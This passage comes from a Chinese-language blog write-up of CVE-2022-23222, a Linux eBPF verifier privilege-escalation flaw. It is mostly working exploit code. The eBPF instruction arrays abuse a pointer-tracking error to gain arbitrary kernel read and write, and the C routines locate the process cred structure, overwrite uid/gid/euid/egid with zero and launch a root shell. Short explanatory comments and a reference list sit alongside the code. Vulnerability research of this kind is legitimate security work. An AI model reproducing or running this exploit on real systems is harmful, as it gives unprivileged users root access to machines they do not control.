BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 复制PTR_TO_MEM_OR_NULL类型指针，副本保存在r1。</span></span><br><span class="line">    <span class="comment">// r1 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    <span class="comment">// r1 = r1 + 1</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不可能发生。ringbuf的大小虽然为PAGE_SIZE，但其中一部分用于存储关于ringbuf的结构体，剩下的才用于存储数据。</span></span><br><span class="line">    <span class="comment">// 因此，请求保留PAGE_SIZE的内存不可能实现。</span></span><br><span class="line">    <span class="comment">// if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 经过上面的NULL检查后，verifier认为r0=0。</span></span><br><span class="line">    <span class="comment">// 由于r1是由r0派生出来的，因此verifier也会认为r1=0。但实际上，r1=1。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// r7 = (r1 + 1) * 8</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, <span class="number">8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verifier认为r7=8，但实际上r7=16。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试发现array指针都是0xFFFF..........10</span></span><br><span class="line">    <span class="comment">// 将该指针保存到r10-8处</span></span><br><span class="line">    <span class="comment">// *(u64 *)(r10 - 8) = r8</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, <span class="number">-8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向r10-16写入r7=16个字节，覆盖r10-8处的array指针。</span></span><br><span class="line">    <span class="comment">// 写入字节为可控，可将array指针改成任意地址。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_skb_load_bytes_relative(r9, 0, r10-16, r7, 0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_5, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes_relative),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取修改后的指针。</span></span><br><span class="line">    <span class="comment">// r6 = *(u64 *)(r10 - 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, <span class="number">-8</span>),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取修改后指针所指向的8个字节数据，实现任意读。</span></span><br><span class="line">    <span class="comment">// 之所以可以读取成功，是因为verifier以为该指针仍为array指针。</span></span><br><span class="line">    <span class="comment">// r0 = *(u64 *)(r6 + 0)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, <span class="number">0</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将读取的数据写入array map传回用户态。</span></span><br><span class="line">    <span class="comment">// *(u64 *)(r8 + 0) = r0</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>实现任意写原语的 eBPF 程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">arbitrary_write</span>[] = &#123;</span></span><br><span class="line">    <span class="comment">// 保存r1，r1被内核初始化为指向skb的指针。</span></span><br><span class="line">    <span class="comment">// r9 = r1</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取array指针，r0类型为PTR_TO_MAP_VALUE_OR_NULL。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd),</span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 必需的判断，令false分支的r0变成PTR_TO_MAP_VALUE类型。</span></span><br><span class="line">    <span class="comment">// if (r0 == NULL) exit(1)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将array指针保存进r8。</span></span><br><span class="line">    <span class="comment">// r8 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取PTR_TO_MEM_OR_NULL类型指针，保存在r0。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve),</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 复制PTR_TO_MEM_OR_NULL类型指针，副本保存在r1。</span></span><br><span class="line">    <span class="comment">// r1 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    <span class="comment">// r1 = r1 + 1</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不可能发生。ringbuf的大小虽然为PAGE_SIZE，但其中一部分用于存储关于ringbuf的结构体，剩下的才用于存储数据。</span></span><br><span class="line">    <span class="comment">// 因此，请求保留PAGE_SIZE的内存不可能实现。</span></span><br><span class="line">    <span class="comment">// if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 经过上面的NULL检查后，verifier认为r0=0。</span></span><br><span class="line">    <span class="comment">// 由于r1是由r0派生出来的，因此verifier也会认为r1=0。但实际上，r1=1。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// r7 = (r1 + 1) * 8</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, <span class="number">8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verifier认为r7=8，但实际上r7=16。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试发现array指针都是0xFFFF..........10</span></span><br><span class="line">    <span class="comment">// 将该指针保存到r10-8处</span></span><br><span class="line">    <span class="comment">// *(u64 *)(r10 - 8) = r8</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, <span class="number">-8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向r10-16写入r7=16个字节，覆盖r10-8处的array指针。</span></span><br><span class="line">    <span class="comment">// 写入字节为可控，可将array指针改成任意地址。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_skb_load_bytes_relative(r9, 0, r10-16, r7, 0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_5, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes_relative),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取修改后的指针。</span></span><br><span class="line">    <span class="comment">// r6 = *(u64 *)(r10 - 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, <span class="number">-8</span>),</span><br><span class="line">  	</span><br><span class="line">    <span class="comment">// 从array map中获取从用户态传入的数据。</span></span><br><span class="line">    <span class="comment">// r0决定写入8字节还是4字节，r1则为写入的值。</span></span><br><span class="line">    <span class="comment">// r0 = *(u64 *)(r8 + 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0</span>),</span><br><span class="line">    <span class="comment">// r1 = *(u64 *)(r8 + 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, <span class="number">8</span>),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 实现任意写。</span></span><br><span class="line">    <span class="comment">// 之所以可以写入成功，是因为verifier以为r6仍为array指针。</span></span><br><span class="line">    <span class="comment">// if (r0 == 0) &#123; *(u64*)r6 = r1 &#125;</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP_IMM(BPF_JA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// else &#123; *(u32*)r6 = r1 &#125;</span></span><br><span class="line">    BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_1, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-定位进程cred"><a href="#4-4-定位进程cred" class="headerlink" title="4.4 定位进程cred"></a>4.4 定位进程cred</h3><p>调试发现，进程的 cred 有一定概率在泄露的 array 指针之后。因此需要多创建几个进程，避免利用失败。</p>
<p>所有进程通过 prctl(PR_SET_NAME, __ID__, 0, 0, 0) 将进程名称设置为固定字符串，在此使用 SCSLSCSL 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spawn_processes</span><span class="params">(<span class="keyword">context_t</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PROC_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">pid_t</span> child = fork();</span><br><span class="line">        <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prctl(PR_SET_NAME, __ID__, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                WARNF(<span class="string">"Could not set name"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">uid_t</span> old = getuid();</span><br><span class="line">            kill(getpid(), SIGSTOP);</span><br><span class="line">            <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">            <span class="keyword">if</span> (uid == <span class="number">0</span> &amp;&amp; old != uid) &#123;</span><br><span class="line">                OKF(<span class="string">"Enjoy root!"</span>);</span><br><span class="line">                system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(uid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (child &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> child;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;processes[i] = child;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后，各进程依次尝试通过任意读原语，在 array 指针之后 PAGE_SIZE * PAGE_SIZE 大小的内核空间搜索 SCSLSCSL 字符串，来定位进程的 cred 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_cred</span><span class="params">(<span class="keyword">context_t</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE*PAGE_SIZE ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        u64 val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">kaddr_t</span> addr = ctx-&gt;array_map + PAGE_SIZE + i*<span class="number">0x8</span>;</span><br><span class="line">        <span class="keyword">if</span> (arbitrary_read(ctx, addr, &amp;val, BPF_DW) != <span class="number">0</span>) &#123;</span><br><span class="line">            WARNF(<span class="string">"Could not read kernel address %p"</span>, addr);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// DEBUGF("addr %p = 0x%016x", addr, val);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;val, __ID__, <span class="keyword">sizeof</span>(val)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">kaddr_t</span> cred_from_task = addr - <span class="number">0x10</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (arbitrary_read(ctx, cred_from_task + <span class="number">8</span>, &amp;val, BPF_DW) != <span class="number">0</span>) &#123;</span><br><span class="line">                WARNF(<span class="string">"Could not read kernel address %p + 8"</span>, cred_from_task);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (val == <span class="number">0</span> &amp;&amp; arbitrary_read(ctx, cred_from_task, &amp;val, BPF_DW) != <span class="number">0</span>) &#123;</span><br><span class="line">                WARNF(<span class="string">"Could not read kernel address %p + 0"</span>, cred_from_task);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (val != <span class="number">0</span>) &#123;</span><br><span class="line">                ctx-&gt;cred = (<span class="keyword">kaddr_t</span>)val;</span><br><span class="line">                DEBUGF(<span class="string">"task struct ~ %p"</span>, cred_from_task);</span><br><span class="line">                DEBUGF(<span class="string">"cred @ %p"</span>, ctx-&gt;cred);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-5-实现提权"><a href="#4-5-实现提权" class="headerlink" title="4.5 实现提权"></a>4.5 实现提权</h3><p>定位到进程 cred 后，即可通过任意写原语修改 cred ，实现提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overwrite_cred</span><span class="params">(<span class="keyword">context_t</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_uid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_gid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_euid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_egid_from_cred, <span class="number">0</span>, BPF_W) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt" target="_blank" rel="noopener">cve-2022-23222-linux-kernel-ebpf-lpe.txt</a></p>
<p><a href="https://www.pentera.io/blog/the-good-bad-and-compromisable-aspects-of-linux-ebpf/" target="_blank" rel="noopener">The Good, Bad and Compromisable Aspects of Linux eBPF - Pentera</a></p>
<p><a href="https://ebpf.io/" target="_blank" rel="noopener">eBPF - Introduction, Tutorials &amp; Community Resources</a></p>
<p><a href="https://www.kernel.org/doc/html/latest/bpf/instruction-set.html" target="_blank" rel="noopener">eBPF Instruction Set — The Linux Kernel documentation</a></p>
<p><a href="https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/" target="_blank" rel="noopener">BPF 进阶笔记（一）：BPF 程序（BPF Prog）类型详解：使用场景、函数签名、执行位置及程序示例</a></p>
<p><a href="https://man7.org/linux/man-pages/man7/bpf-helpers.7.html" target="_blank" rel="noopener">bpf-helpers(7) - Linux manual page</a></p>
<p><a href="https://www.containiq.com/post/libbpf" target="_blank" rel="noopener">Libbpf: A Beginners Guide</a></p>
<p><a href="https://nakryiko.com/posts/libbpf-bootstrap/" target="_blank" rel="noopener">Building BPF applications with libbpf-bootstrap</a></p>
<p><a href="https://nakryiko.com/posts/bpf-ringbuf/" target="_blank" rel="noopener">BPF ring buffer</a></p>
<p><a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md" target="_blank" rel="noopener">bcc/reference_guide.md at master · iovisor/bcc</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2022/07/04/CVE-2022-23222/" data-id="cmd5slr2i000k0lo1de7s4e8o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="../../../../2023/02/01/slabUaf-to-pageUaf/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Linux 内核利用技巧 Slab UAF to Page UAF
        
      </div>
    </a>
  
  
    <a href="../../../02/10/CVE-2021-4034/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">CVE-2021-4034 pkexec 本地提权漏洞利用解析</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/03/">三月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/04/">四月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/10/">十月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="../../../../2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
          </li>
        
          <li>
            <a href="">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
          </li>
        
          <li>
            <a href="../../../02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2025 IceSword Lab<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
  
    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
  
    <a href="../../../../research" class="mobile-nav-link">Research</a>
  
    <a href="../../../../vulnerabilities" class="mobile-nav-link">Vulnerabilities</a>
  
    <a href="../../../../recruitment" class="mobile-nav-link">Recruitment</a>
  
    <a href="../../../../about" class="mobile-nav-link">About</a>
  
